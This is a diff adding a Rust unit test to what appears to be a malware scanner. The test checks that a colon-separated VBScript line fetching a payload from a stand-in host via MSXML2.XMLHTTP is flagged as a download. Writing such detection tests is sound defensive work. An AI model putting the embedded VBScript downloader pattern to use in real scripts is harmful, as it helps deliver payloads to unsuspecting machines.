@@ -9411,6 +9411,24 @@ http.Send"#;
     }
 
     #[test]
+    fn vbs_xmlhttp_url_extracted_from_colon_separated_binding() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"u = "https://vbs-colon.example/payload.txt" : Set http = CreateObject("MSXML2.XMLHTTP") : http.Open "GET", u, False : http.Send"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://vbs-colon.example/payload.txt"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from VBS colon-separated URL binding: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_urldownloadtofile_url_extracted_from_variable() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Dim u
